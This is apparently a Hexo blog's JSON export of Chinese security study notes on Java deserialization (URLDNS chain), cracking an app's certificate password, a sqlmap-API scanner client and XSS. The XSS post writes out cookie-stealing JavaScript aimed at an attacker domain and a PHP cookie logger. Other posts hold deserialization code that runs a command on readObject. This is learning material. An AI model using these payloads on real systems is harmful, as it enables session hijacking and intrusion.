{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"java反射和URLDNS链分析","slug":"java反射和URLDNS链分析","date":"2021-09-21T09:21:56.000Z","updated":"2021-09-21T09:22:49.977Z","comments":true,"path":"2021/09/21/java反射和URLDNS链分析/","link":"","permalink":"http://example.com/2021/09/21/java%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS%E9%93%BE%E5%88%86%E6%9E%90/","excerpt":"","text":"前言 java反序列化很复杂，一步一步看看究竟是怎么个原理。这篇文章的老师是B站up主-白日梦组长 简单反序列化 首先定义一个类 12345678910111213141516171819202122232425262728293031323334import java.io.Serializable;public class Person implements Serializable &#123; private String name; private int age; public Person()&#123; &#125; public Person(String name,int age)&#123; this.name = name; this.age =age; &#125; @Override public String toString()&#123; return &quot;Person&#123;&quot; + &quot;name =&#x27;&quot; + name +&#x27;\\&#x27;&#x27; + &quot;,age=&quot; + age + &#x27;&#125;&#x27;; &#125; public void action(String act)&#123; System.out.println(act); &#125; private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123; ois.defaultReadObject(); Runtime.getRuntime().exec(&quot;calc&quot;); &#125;&#125; 序列化: 123456789101112131415161718192021import java.io.*;import java.net.HttpURLConnection;import java.net.URI;import java.util.HashMap;import java.util.Map;public class SerializationTest &#123; public static void serialize(Object obj) throws IOException&#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static void main(String[] args) throws Exception&#123; Person person = new Person(&quot;aa&quot;,22);// System.out.println(person); serialize(person); &#125;&#125; 反序列化： 12345678910111213141516import java.io.*;public class UnserializeTest &#123; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125; public static void main(String[] args) throws Exception&#123; Person person = (Person) unserialize(&quot;ser.bin&quot;); System.out.println(person); &#125; &#125; 上面的代码最主要的是两段： 1234public static void serialize(Object obj) throws IOException&#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; 这里定义了一个反序列化方法serialize, 新建一个ObjectOutputStream类oos，传入对象，通过FileOutputStream把传入的对象输出到ser.bin内，在通过调用oos的writeObject方法将对象序列化。 注意第一段在定义类时，public class Person implements Serializable ，有一个接口 Serializable当注释掉接口时，是无法进行反序列化的。 为什么会产生安全问题？ 只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。 可能的形式： 1、入口类的readObject直接调用危险方法 2、入口类参数中包含可控类，该类有危险方法，readObject时调用 3、入口类参数中包含可控类,该类又调用其他危险方法的类，readObject时调用 一、入口类的readObject直接调用危险方法 1234private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123; ois.defaultReadObject(); Runtime.getRuntime().exec(&quot;calc&quot;);&#125; 在Person类内重写readobject方法，加入以上代码，反序列化是就会直接弹出计算器。 这种情况几乎没有。 二、入口类参数中包含可控类，该类有危险方法，readObject时调用 寻找入口类，这一种类要满足几个条件：(1) 继承了Serializable (2) 重写了readObject，在内部调用了一个常见的函数 (3)参数类型广泛(4) 最好JDK自带，比如MAP类 然后寻找调用链(gadget chain)相同名称，相同类型的父类， 最后找执行类，确定造成什么漏洞 java反射 什么是java反射？ 反射（Reflection）允许程序在执行期借助于Reflection API取得任何类的內部信息，并能直接操作任意对象的内部属性及方法。 我的理解就是原本是根据类来实例化对象，对象的方法继承自父类。拥有反射机制的我们，可以根据这个已经实例化的对象，通过Reflection API来获取对象的类的属性，方法，并可以对他们进行操作。 123456public class ReflectionTest &#123; public static void main(String[] args) throws Exception&#123; Person person = new Person(); Class c =person.getClass(); &#125;&#125; Class 和 class 有什么区别？ 我的理解是就是描述类的类？比如person.class，other.class等都属于Class。Class带有的Methon，Filed，Constructor等用来获取。反射的所有操作就是针对Class 从原型class实例化对象 1234// 把对象的类具体化。获取对象所属的类的构造函数Constructor personconstructor = c.getConstructor(String.class,int.class);//实例化Person p = (Person) personconstructor.newInstance(&quot;abc&quot;,22); 获取类里的方法 1234567Field[] personfileds = c.getFields();//获取person类的属性返回一个数组Field[] personfileds = c.getDeclaredFields();//获取person类的属性返回一个数组b包括私有属性// 获取并改变对象的属性，年龄被改成33Field namefield = c.getDeclaredField(&quot;age&quot;);namefield.setAccessible(true);namefield.set(p,33); 调用类里的方法actionmethod.invoke(p,“fasdfasf”); 1234567// 获取类里的方法 到personmehton数组Method[] personmethod = c.getDeclaredMethods();// 获取函数的action方法 这个方法需要的参数是String类型的Method actionmethod = c.getMethod(&quot;action&quot;,String.class);// 使用invoke方法调用函数actionmethod.invoke(p,&quot;fasdfasf&quot;); ysoserial反序列化工具–URLDNS分析 ysoserial是款很强大的反序列化工具，根据上面所述，对其中的URLDNS进行分析。 根据前面讲的，我们首先需要一个强大的入口类，他可以传递很多类型的参数，继承了Serializable，重写了readObject，java自带。这里借助的就是hashmap类 首先是关于hashmap: hashmap需要传入一对键值，由hashmap的key进行hash计算时，如果key为URL类的对象，则调用key.hashcode实际为调用了URL类对象的hashcode。 URL类的hashcode,可以看到hashcode如果等于-1就会进入handler内的hashcode方法 这时候就会调用函数根据域名获取地址。做一个域名解析。 IDEA调试 12345678 public static void main(String[] args) throws Exception&#123;// Person person = new Person(&quot;aa&quot;,22);// System.out.println(person); HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;HTTP://ecu5t8psotdkhhlgfae16al1mssig7.burpcollaborator.net&quot;); hashmap.put(url, 1); serialize(hashmap); &#125; 我们在SerializationTest新建一个hashmap对象，用put方法传入用burp生成的url（类似DNSlog），put传入的两个值，第一个参数作为key计算hash码，如果算出的key值不是null，就将算出的值覆盖value，反之就保留value的值。将hashmap序列化。我们在burp看到，返回记录 。 这里我们还没有反序列化就执行了，为什么？ 调用URL类对象的hashcode时，hashcode会初始化为-1，会直接调用后面的函数，因此我们需要在序列化之前将hashcode的值设置成不是-1，在反序列化时再改回-1。这里就需要使用反射。 12345678910111213141516 public static void main(String[] args) throws Exception&#123;// Person person = new Person(&quot;aa&quot;,22);// System.out.println(person); HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;HTTP://a9kd16wf12a011enkkytrkvn0e64ut.burpcollaborator.net&quot;); // 反射，先把hashcode的值改成不是-1 Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url, 12); // 传入url hashmap.put(url, 1); // 再把hashcode的值改回-1 hashcodefield.set(url, -1); serialize(hashmap); &#125; 此时我们在序列化时就不会触发dnslog，在反序列化时触发了dnslog 回顾 整个流程如下： 找到HashMap的接口，使用PUT方法传入两个参数，第一个数就是URL类对象，第二个值任意。 这里需要明确HashMap传入的第一个值作为key，put进去的key会被作为参数传递给hash()，hash会返回一个值，调用的是key自带的hashCode方法。 此时就调用了URL的hashCode方法，如果hashCode的值是-1就会进入handler.hashCode()，进入之后，就根据URL获取一个地址，也就是最后的执行点。 这里的入口是A(HashMap)，接受参数O。我们的目标是B(URL)，是为了调用B的f方法，因此我们将B作为参数传递给A，这里就需要O和B的f方法是同名的。（有点移花接木的感觉） A.readObject -&gt; O.f -&gt; B.f","categories":[],"tags":[{"name":"java反序列化","slug":"java反序列化","permalink":"http://example.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"soulapp证书的逆向寻找","slug":"soulapp证书的逆向寻找","date":"2021-09-20T13:02:01.000Z","updated":"2021-09-20T13:09:46.734Z","comments":true,"path":"2021/09/20/soulapp证书的逆向寻找/","link":"","permalink":"http://example.com/2021/09/20/soulapp%E8%AF%81%E4%B9%A6%E7%9A%84%E9%80%86%E5%90%91%E5%AF%BB%E6%89%BE/","excerpt":"","text":"前言 在使用burp抓移动端的soulapp的包时，抓包失败。因为存在证书验证，要抓包就要写在burp内导入证书，但是证书是带密码的，因此就要先找到密码才有后续 GDA和IDApro获取证书密码 （1）在GDA中打开soul的apk文件，并搜索.p12 （2）双击进入，找到client.p12 （3）对相关的java代码进行查询分析，知道密码是“v1.toCharArray()” (4) 向上寻找密码来源，发现最终调用的是非java代码： （5）查询初始化位置，看到导入了soul-netsdk （6）在soul文件夹中找到soul-netsdk.so文件，在IDA中打开，并搜索调用的函数，找到疑似密码的值： （7）使用java在线编程，处理可疑值，并尝试导入证书： HOOK证书密码 （1）下载xposed 安装框架，添加Inspeckage模块。 （2）在本机逍遥模拟器adb.exe所在的目录下打开命令行窗口，连接到逍遥模拟器，并设置端口转发： （3）在Inspeckage模块选择soul，同时在本地浏览器打开127.0.0.1:8008 可以看到： （4）设置HOOK： （5）：Launch app点击 ，发起请求： （6）最后得到结果","categories":[],"tags":[]},{"title":"python编写利用sqlmap-api的检测脚本","slug":"python编写利用sqlmap-api的检测脚本","date":"2021-09-20T12:21:06.000Z","updated":"2021-09-20T12:57:38.244Z","comments":true,"path":"2021/09/20/python编写利用sqlmap-api的检测脚本/","link":"","permalink":"http://example.com/2021/09/20/python%E7%BC%96%E5%86%99%E5%88%A9%E7%94%A8sqlmap-api%E7%9A%84%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105import requestsimport jsonimport timeclass Client(): def __init__(self,server_ip,server_port,admin_token=&quot;&quot;,taskid=&quot;&quot;,filepath=None): self.server = &quot;http://&quot; + server_ip + &quot;:&quot; + server_port self.admin_token = admin_token self.taskid = taskid self.filepath = &quot;&quot; self.status = &quot;&quot; self.scan_start_time = &quot;&quot; self.scan_end_time = &quot;&quot; self.engineid=&quot;&quot; self.headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125; def create_new_task(self): &#x27;&#x27;&#x27;创建一个新的任务，创建成功返回taskid&#x27;&#x27;&#x27; r = requests.get(&quot;%s/task/new&quot;%(self.server)) self.taskid = r.json()[&#x27;taskid&#x27;] if self.taskid != &quot;&quot;: return self.taskid else: print(&quot;创建任务失败!&quot;) return None def set_task_options(self,url): &#x27;&#x27;&#x27;设置任务扫描的url等&#x27;&#x27;&#x27; self.filepath = url def start_target_scan(self,url): &#x27;&#x27;&#x27;开始扫描的方法,成功开启扫描返回True，开始扫描失败返回False&#x27;&#x27;&#x27; r = requests.post(self.server + &#x27;/scan/&#x27; + self.taskid + &#x27;/start&#x27;, data=json.dumps(&#123;&#x27;url&#x27;:url,&#x27;getCurrentUser&#x27;:True,&#x27;getBanner&#x27;:True,&#x27;getCurrentDb&#x27;:True&#125;), headers=self.headers) if r.json()[&#x27;success&#x27;]: self.scan_start_time = time.time() #print(r.json()) #print(r.json()[&#x27;engineid&#x27;]) return r.json()[&#x27;engineid&#x27;] else: #print(r.json()) return None def get_scan_status(self): &#x27;&#x27;&#x27;获取扫描状态的方法,扫描完成返回True，正在扫描返回False&#x27;&#x27;&#x27; self.status = json.loads(requests.get(self.server + &#x27;/scan/&#x27; + self.taskid + &#x27;/status&#x27;).text)[&#x27;status&#x27;] if self.status == &#x27;terminated&#x27;: self.scan_end_time = time.time() #print(&quot;扫描完成!&quot;) return True elif self.status == &#x27;running&#x27;: #print(&quot;Running&quot;) return False else: #print(&quot;未知错误！&quot;) self.status = False def get_result(self): &#x27;&#x27;&#x27;获取扫描结果的方法，存在SQL注入返回payload和注入类型等，不存在SQL注入返回空&#x27;&#x27;&#x27; if(self.status): r = requests.get(self.server + &#x27;/scan/&#x27; + self.taskid + &#x27;/data&#x27;) if (r.json()[&#x27;data&#x27;]): return r.json()[&#x27;data&#x27;] else: return None def get_all_task_list(self): &#x27;&#x27;&#x27;获取所有任务列表&#x27;&#x27;&#x27; r = requests.get(self.server + &#x27;/admin/&#x27; + self.admin_token + &quot;/list&quot;) if r.json()[&#x27;success&#x27;]: #print(r.json()[&#x27;tasks&#x27;]) return r.json()[&#x27;tasks&#x27;] else: return None def del_a_task(self,taskid): &#x27;&#x27;&#x27;删除一个任务&#x27;&#x27;&#x27; r = requests.get(self.server + &#x27;/task/&#x27; + taskid + &#x27;/delete&#x27;) if r.json()[&#x27;success&#x27;]: return True else: return False def stop_a_scan(self,taskid): &#x27;&#x27;&#x27;停止一个扫描任务&#x27;&#x27;&#x27; r = requests.get(self.server + &#x27;/scan/&#x27; + taskid + &#x27;/stop&#x27;) if r.json()[&#x27;success&#x27;]: return True else: return False def flush_all_tasks(self): &#x27;&#x27;&#x27;清空所有任务&#x27;&#x27;&#x27; r =requests.get(self.server + &#x27;/admin/&#x27; + self.admin_token + &quot;/flush&quot;) if r.json()[&#x27;success&#x27;]: return True else: return False def get_scan_log(self): &#x27;&#x27;&#x27;获取log&#x27;&#x27;&#x27; r = requests.get(self.server + &#x27;/scan/&#x27; + self.taskid + &#x27;/log&#x27;) return r.json() 12345678910111213141516171819202122232425262728293031323334353637from Service import Clientimport timefrom threading import Threaddef main(): &#x27;&#x27;&#x27;实例化Client对象时需要传递sqlmap api 服务端的ip、port、admin_token和HTTP包的绝对路径&#x27;&#x27;&#x27; print(&quot;————————————————Start Working！—————————————————&quot;) target = input(&quot;url:&quot;) task1 = Thread(target=set_start_get_result,args=(target,)) task1.start()def time_deal(mytime): first_deal_time = time.localtime(mytime) second_deal_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, first_deal_time) return second_deal_time def set_start_get_result(url): #/home/cheng/Desktop/sqldump/1.txt current_taskid = my_scan.create_new_task() print(&quot;taskid: &quot; + str(current_taskid)) my_scan.set_task_options(url=url) print(&quot;扫描id:&quot; + str(my_scan.start_target_scan(url=url))) print(&quot;扫描开始时间：&quot; + str(time_deal(my_scan.scan_start_time))) while True: if my_scan.get_scan_status() == True: print(my_scan.get_result()) print(&quot;当前数据库:&quot; + str(my_scan.get_result()[-1][&#x27;value&#x27;])) print(&quot;当前数据库用户名:&quot; + str(my_scan.get_result()[-2][&#x27;value&#x27;])) print(&quot;数据库版本:&quot; + str(my_scan.get_result()[-3][&#x27;value&#x27;])) print(&quot;扫描结束时间：&quot; + str(time_deal(my_scan.scan_end_time))) print(&quot;扫描日志：\\n&quot; + str(my_scan.get_scan_log())) breakif __name__ == &#x27;__main__&#x27;: my_scan = Client(&quot;127.0.0.1&quot;, &quot;8775&quot;, &quot;c88927c30abb1ef6ea78cb81ac7ac6b0&quot;) main()","categories":[],"tags":[{"name":"sqlmap-api","slug":"sqlmap-api","permalink":"http://example.com/tags/sqlmap-api/"}]},{"title":"关于sqlmap-api的使用","slug":"关于sqlmap-api的使用","date":"2021-09-20T06:07:19.000Z","updated":"2021-09-20T06:07:57.834Z","comments":true,"path":"2021/09/20/关于sqlmap-api的使用/","link":"","permalink":"http://example.com/2021/09/20/%E5%85%B3%E4%BA%8Esqlmap-api%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"前言 SQLMAP作为一款牛逼的SQL注入神器，所有的渗透测试人员几乎人手一份，但是由于SQLMAP每检测一个站点都需要开启一个新的命令行窗口或者结束掉上一个检测任务。虽然 -m 参数可以批量扫描URL，但是模式也是一个结束扫描后才开始另一个扫描任务。通过api接口，下发扫描任务就简单了，无需开启一个新的命令行窗口。 sqlmap api 在下载安装SQLMAP后，你会在sqlmap安装目录中找到一个 sqlmapapi.py 的文件，这个 sqlmapapi.py 文件就是sqlmmap api。sqlmap api分为服务端和客户端，sqlmap api有两种模式，一种是基于HTTP协议的接口模式，一种是基于命令行的接口模式。 使用帮助: 1python sqlmapapi.py -h 开启api服务端 1python sqlmapapi.py -s api服务端在本地8775端口上运行，admin token为1acac56427f272e316fceabe5ddff5a5，IPC数据库的位置在/tmp/sqlmapipc-zOIGm_，api服务端已经和IPC数据库连接上了，正在使用bottle 框架wsgiref标准接口。 但是通过上面的这种方式开启api服务端有一个缺点，当服务端和客户端不是一台主机会连接不上，因此如果要解决这个问题，可以通过输入以下命令来开启api服务端: 1python sqlmapapi.py -s -H &quot;0.0.0.0&quot; -p 8775 命令成功后，远程客户端就可以通过指定远程主机IP和端口来连接到API服务端。 基于HTTP协议的接口模式 下列都是基于HTTP协议API交互的所有方法：提示：“@get”就说明需要通过GET请求的，“@post”就说明需要通过POST请求的；POST请求需要修改HTTP头中的Content-Type字段为application/json。 1234567891011121314151617181920212223#辅助@get(&#x27;/error/401&#x27;) @get(&quot;/task/new&quot;)@get(&quot;/task/&lt;taskid&gt;/delete&quot;)#Admin 命令@get(&quot;/admin/list&quot;)@get(&quot;/admin/&lt;token&gt;/list&quot;)@get(&quot;/admin/flush&quot;)@get(&quot;/admin/&lt;token&gt;/flush&quot;)#sqlmap 核心交互命令@get(&quot;/option/&lt;taskid&gt;/list&quot;)@post(&quot;/option/&lt;taskid&gt;/get&quot;)@post(&quot;/option/&lt;taskid&gt;/set&quot;)@post(&quot;/scan/&lt;taskid&gt;/start&quot;)@get(&quot;/scan/&lt;taskid&gt;/stop&quot;)@get(&quot;/scan/&lt;taskid&gt;/kill&quot;)@get(&quot;/scan/&lt;taskid&gt;/status&quot;)@get(&quot;/scan/&lt;taskid&gt;/data&quot;)@get(&quot;/scan/&lt;taskid&gt;/log/&lt;start&gt;/&lt;end&gt;&quot;)@get(&quot;/scan/&lt;taskid&gt;/log&quot;)@get(&quot;/download/&lt;taskid&gt;/&lt;target&gt;/&lt;filename:path&gt;&quot;) @get(’/error/401’): 结合这段代码： 1234@return_error(401) # Access Denieddef error401(error=None): security_headers(False) return &quot;Access denied&quot; 首先需要登录（Admin token），不然会返回状态码401。 @get(&quot;/task/new&quot;) 该接口用于创建一个新的任务，使用后会返回一个随机的taskid 在python内调用： @get(&quot;/task//delete&quot;) 该接口用于删除taskid。在调用时指定taskid @get(&quot;/admin/list&quot;) @get(&quot;/admin//list&quot;) 该接口用于返回所有taskid。也可以在调用时指定taskid，返回所有id的状态 调用接口： @get(&quot;/admin/flush&quot;) @get(&quot;/admin//flush&quot;) 该接口用于删除所有任务 调用接口： @post(&quot;/option//set&quot;) 该接口为特定任务ID设置选项值，调用时请指定taskid 调用接口： @get(&quot;/option//list&quot;) 该接口可获取特定任务ID的列表选项，调用时指定taskid。 调用接口： @post(&quot;/option//get&quot;) 该接口可获取特定任务ID的选项值，调用时请指定taskid d 调用接口： @post(&quot;/scan//start&quot;) 该接口定义开始扫描特定任务，调用时请指定taskid 调用接口：需要提前借助status来看是否运行 @get(&quot;/scan//stop&quot;) 该接口定义停止扫描特定任务，调用时请指定taskid 调用接口： @get(&quot;/scan//kill&quot;) 该接口可杀死特定任务，需要指定taskid @get(&quot;/scan//status&quot;) 该接口可查询扫描状态，调用时请指定taskid @get(&quot;/scan//data&quot;) 该接口可获得到扫描结果，调用时请指定taskid 调用接口： @get(&quot;/scan//log//&quot;) @get(&quot;/scan//log&quot;) 该接口可查询特定任务的扫描的日志，调用时请指定taskid 调用接口： @get(&quot;/download///filename:path&quot;) 下载服务端指定任务的文件 总结 基于HTTP的接口模式用起来可能比较繁琐，但是对于程序调用接口还是很友善的。总之该模式的流程是： 1、通过GET请求 http://ip:port/task/new 这个地址，创建一个新的扫描任务； 2、通过POST请求http://ip:port/scan//start 地址，并通过json格式提交参数，开启一个扫描；通过GET请求 http://ip:port/scan//status 地址，即可获取指定的taskid的扫描状态。这个返回值分为两种，一种是run状态（扫描未完成），一种是terminated状态（扫描完成）； 3、扫描完成后获取扫描的结果。","categories":[],"tags":[{"name":"sqlmap api","slug":"sqlmap-api","permalink":"http://example.com/tags/sqlmap-api/"}]},{"title":"api接口来验证存在sql注入漏洞","slug":"api接口来验证存在sql注入漏洞","date":"2021-09-20T03:42:07.000Z","updated":"2021-09-20T03:42:07.122Z","comments":true,"path":"2021/09/20/api接口来验证存在sql注入漏洞/","link":"","permalink":"http://example.com/2021/09/20/api%E6%8E%A5%E5%8F%A3%E6%9D%A5%E9%AA%8C%E8%AF%81%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"三种xss的利用学习笔记","slug":"三种xss的利用学习笔记","date":"2021-09-20T01:53:16.000Z","updated":"2021-09-20T02:43:08.222Z","comments":true,"path":"2021/09/20/三种xss的利用学习笔记/","link":"","permalink":"http://example.com/2021/09/20/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"XSS简介 跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码(一般是JS代码)到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。它常常与其他漏洞一起造成破坏性的后果。 XSS的分类 XSS漏洞表现为多种形式，并且分为三种类型：反射型、储存型，DOM型。 反射型XSS 反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。 提取用户提交的输入并将其插入到服务器相应的html代码中，这是XSS漏洞的明显特征，如果应用程序没有实施任何过滤和净化，那么它很容易被攻击。 在输入框中咱们构造如下JS代码 1&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; 如果页面出现弹窗，说明咱们插入的恶意代码被执行，结果如下图 如何利用反射型XSS漏洞呢？ 最简单的一种攻击就是攻击者截获通过验证用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能。 (1) 用户登录应用程序 (2) 攻击者将自己准备的url提交给用户 (3) 用户请求攻击者url (4) 服务器对攻击者的js代码做出回应 (5) 攻击者的js代码在服务器中运行 (6) 用户的浏览器向攻击者发送会话文件 (7) 攻击者劫持用户的会话 攻击者创建的恶意代码为 1var i=new Image;i.src=&quot;http://shenmewanyi.com/&quot;+document.cookie; 这段代码可以让用户浏览器向shenmewanyi.com(攻击者拥有的一个域)提出一个请求。请求中包含用户访问应用程序的当前会话令牌。 存储型XSS 如果一名用户提交的数据被保存到数据库中，然后不经过过滤或净化就显示给其他用户，这时候就会出现存储型XSS。 利用存储型XSS漏洞的攻击至少需要向应用程序提出两个请求。攻击者在第一个请求中构造JavaScript，应用程序接受并保存。在第二个请求中，一名受害者查看包含恶意代码的页面，这时JavaScript开始执行。 依然是会话劫持: (1) 攻击者现在程序提交恶意代码，用户登录应用程序 (2) 用户浏览带有恶意代码的界面 (3) 服务器对攻击者的js代码做出回应 (4) 攻击者的js代码在服务器中运行 (6) 用户的浏览器向攻击者发送会话文件 (7) 攻击者劫持用户的会话 因为存储型XSS是永久性的，所以往往造成更大的安全威胁。攻击者可以向应用程序提交一些专门设计的数据，然后等待受害者访问它们。如果其中一位受害者是管理员，那么攻击者可以完全攻破整个应用程序。 参考dvwa的核心代码 12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );&#125;?&gt; 在上面代码中，获取POST参数mtxMessage和txtName，然后将将参数插入到数据库的表中，并显示到页面上。页面的功能是获取用户名字和内容并插入到数据库中，如果我们输入恶意代码，那么也会插入到数据库中，只有用户访问这个页面，那么恶意代码就会执行。 DOM型XSS 反射型和储存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。DOM型XSS没有这种特点，在这种漏洞中，攻击者的JavaScript通过下面方式提交。 1,用户请求一个经过专门设计的URL，它由攻击者提交，并且其中包含嵌入式JavaScript。 2,服务器的响应中并不以任何形式包含攻击者的代码。 3,当用户的浏览器处理这个响应时，上述脚本得以处理。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 cookie盗取 首先找到一个存在XSS漏洞的点， 1&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; 然后可以自己利用phpstudy创建一个网站，在根目录下创建一个any.php文件，添加代码 123456&lt;?php $cookie = $_GET[&#x27;cookie&#x27;]; //获取cookie $log = fopen(&quot;cookie.txt&quot;,&quot;a&quot;); fwrite($log,$cookie.&quot;\\n&quot;); //写入文件并保存 fclose($log)?&gt; 再存在XSS的位置输入： document.location='http://你的IP/any.php?cookie='+document.cookie; 受攻击的服务器的cookie信息就会发送到攻击者的服务器并保存。","categories":[],"tags":[{"name":"xss 渗透测试","slug":"xss-渗透测试","permalink":"http://example.com/tags/xss-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"《代码审计：企业级web代码安全架构》学习总结（一）","slug":"《代码审计：企业级web代码安全架构》学习总结（一）","date":"2021-09-19T15:51:33.000Z","updated":"2021-09-19T15:52:06.815Z","comments":true,"path":"2021/09/19/《代码审计：企业级web代码安全架构》学习总结（一）/","link":"","permalink":"http://example.com/2021/09/19/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"一、通用代码审计思路 (1): 敏感关键字回溯参数传递过程 (2): 查找可控变量，正向追踪变量传递过程 (3): 寻找敏感功能点，通读功能点代码 (4): 全文代码通读 1、敏感函数回溯参数过程 ​ 要形成漏洞的条件是1）可控变量、2）危险函数 ​ 例如SQL漏洞，关键字有select ,insert等，再结合from,where等关键字，我们可以判断是不是一条sql语句，再根据sql注入相关的条件，看看是不是有危险参数传入。 ​ 这种方法有点是速度快，但是在对漏洞定位利用会花费更多的时间，对逻辑漏洞挖掘覆盖不到。 2、通读全文代码 ​ 首先是要关注程序的目录结构，特别注意： 函数集文件（通常名字里带function，common等关键字） 配置文件（名中可能带config） 安全过滤文件（带有filter,safe,check等） index文件 3、根据功能点定向审计 文件上传功能 例如，文章编辑，资料编辑，头像上传，附件上传等等。 文件管理功能 程序将文件名或者文件路径直接在参数中传递，则会造成任意文件操作漏洞，例如文件读取就是在路径中使用…/或者…\\跳转 登录认证功能 目前的认证方式大多数是基于cookie和session，一些程序为了用户体验，保持较长时间的登录，就会直接从cookie中读取用户信息，这时，cookie的加密算法是不是可信就是个问题，若cookie加密时没有加salt一类的东西，就容易导致任意用户登录漏洞或与越权漏洞。 找回密码功能 二、漏洞挖掘 1、SQL注入 ​ 一般SQL注入经常出现在登录页面，获取http头，订单处理等地方，另外在订单系统里涉及的交互较多，容易造成二次注入。 ​ **普通注入：**指通过注入union查询可以直接查询数据库，一般的SQL注入工具可以很好的利用。在审计是 可以多关注如select from, mysql_connect, mysql_query等，数据库查询方式还有 update,insert,delete。 ​ 编码注入： 宽字节注入 当设置“set character_set_client = gbk”时会导致一个编码转换的注入问题，例如当我们的注入参数里带有%df%27时，会将过滤函数加上的\\(也就是%5c)“吃掉”，形成一个新的字符绕过过滤。 二次urldecode注入 原理是我们将参数提交到webserver时，webserver会自动解码一次，例如目标开起了gpc，我们提交?id=1%2527，因为我们提交的参数里没有单引号，所以会被解码，%25的解码效果是%，解码后的结果是1%27。此时程序内要是使用了urlcode或者rawurldecode函数来解码id参数，解码结果是?id=1’。在审计时可以通过搜索urldecode和rawurldecode函数来挖掘漏洞。 漏洞防范： gpc/runtime魔术引号 针对单引号，双引号，反斜杠及空字符NULL进行过滤，但是在int型的注入上没有多大作业 addslashes函数 与GPC作用一样，常用于函数开头首先检验是否开启GPC。 mysql_real_escape_string函数 intval等字符转换 主要针对int型注入 预编译 2、XSS漏洞 ​ 